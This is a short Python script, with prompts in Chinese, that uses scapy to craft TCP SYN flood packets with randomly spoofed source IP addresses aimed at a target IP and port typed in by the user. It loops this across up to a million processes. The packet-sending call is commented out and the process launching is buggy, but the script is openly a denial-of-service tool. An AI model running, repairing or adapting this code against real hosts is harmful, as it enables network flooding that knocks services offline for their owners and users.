from scapy.all import *
import os
import sys
import random
import threading
import multiprocessing as mp

def randomIP():
	ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
	return ip

def randInt():
	x = random.randint(1000,9000)
	return x	

def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	print ("发送中!!!")
	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP ()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP
		IP_Packet.hwlen = 6
		IP_Packet.plen = 4

		TCP_Packet = TCP ()	
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		pkt = (Ether()/IP_Packet/TCP_Packet/Raw(RandString(size=1500)))
		# sendp(pkt)
		pkt.show()
		print("send",total)
		total+=1



def info():
	os.system("cls")


	dstIP = input ("\n目标IP : ")
	dstPort = input ("目标端口 : ")


	
	return dstIP,int(dstPort)
	

def main():
	dstIP,dstPort = info()
	counter = input ("你想发送多少数据包?(1 - 1000000) : ")
	t_list=[]
	for i in range(1,1000000):
		 t_list.append(mp.Process(target=SYN_Flood, args=(SYN_Flood(dstIP,dstPort,int(counter)))))

	for t in t_list:
		t.start()
	for t in t_list:
		t.join()
	

main()
